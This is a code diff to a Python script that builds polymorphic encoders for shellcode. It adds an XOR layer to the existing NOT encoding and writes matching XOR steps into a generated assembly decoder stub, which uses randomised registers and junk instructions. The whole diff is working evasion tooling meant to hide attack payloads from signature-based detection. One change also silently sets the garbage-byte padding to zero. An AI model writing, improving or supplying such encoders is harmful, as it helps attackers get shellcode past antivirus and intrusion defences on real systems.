@@ -42,7 +42,6 @@ def callPoly(count):
                         source = random.randint(0, len(callListRegisters)-1)
                         destination = random.randint(0, len(callListRegisters)-1)
                         ass += "\t" + callListInstructions[command] + " " + callListRegisters[destination] + ", " + callListRegisters[source] + "\n"
-
 	return ass
 
 
@@ -51,6 +50,11 @@ if len(sys.argv) < 2:
 else:
 	# stopping Byte declaration
 	stoppingByte = hex(random.randint(1, 255))
+	# XOR byte declaration
+	while True:
+		xorByte = random.randint(1, 255)
+		if hex(xorByte) != stoppingByte:
+			break
 	# load shell from a file
 	if len(sys.argv) > 2:
         	if sys.argv[1] == '-f':
@@ -68,8 +72,10 @@ else:
 	originalShellcodeLength = 0
 	for x in bytearray(content):
 		originalShellcodeLength += 1
+		# XOR encode
+		y = x^xorByte
 		# NOT encode
-		curValue = ~x
+		curValue = ~y
 		curValue = hex(curValue & 0xff)
 		input += curValue
 		if originalShellcodeLength == len(bytearray(content)):
@@ -101,7 +107,7 @@ else:
 	randomString = [random.choice(string.ascii_letters) for n in xrange(10)]
 	garbageLabel = "".join(randomString)
 	garbageBytes = ""
-	numberOfGarbageBytes = random.randint(0, 5)
+	numberOfGarbageBytes = random.randint(0, 0)
 	for i in range(numberOfGarbageBytes):
 		tmpRnd2 = random.randint(1, 255)
 		garbageBytes += str(hex(tmpRnd2)) + ", "
@@ -169,6 +175,7 @@ else:
                 assembler += "\tmov " + tmpValue + ", " + commonRegisters[tmpRegister] + "\n"
 	assembler += "\txor " + tmpValue + ", " + tmpValue + "\n"
 	assembler += "\tnot byte [" + popRegister + " +  " + str(numberOfGarbageBytes) + "]\n"	
+	assembler += "\txor byte [" + popRegister + " +  " + str(numberOfGarbageBytes) + "], " + str(hex(xorByte)) + "\n"
 	# access decode procedure
 	assembler += decode + ":\n"
 	assembler += "\tmov " + tmpValueLowerByte + ", byte [" + popRegister + " + " + insertIterator + " + " + str(numberOfGarbageBytes) + "]\n"
@@ -177,6 +184,7 @@ else:
 	assembler += "\tmov " + tmpValueLowerByte + ", byte [" + popRegister + " + " + insertIterator + " + 1 + " + str(numberOfGarbageBytes) + "]\n"
 	assembler += "\tmov byte [" + shellIterator + "], " + tmpValueLowerByte + "\n"
 	assembler += "\tnot byte [" + shellIterator + "]\n"
+	assembler += "\txor byte [" + shellIterator + "], " + str(hex(xorByte)) + "\n"
 	tmpRand = random.randint(0, 1)
 	if tmpRand == 0:
 		assembler += "\tinc " + shellIterator + "\n"
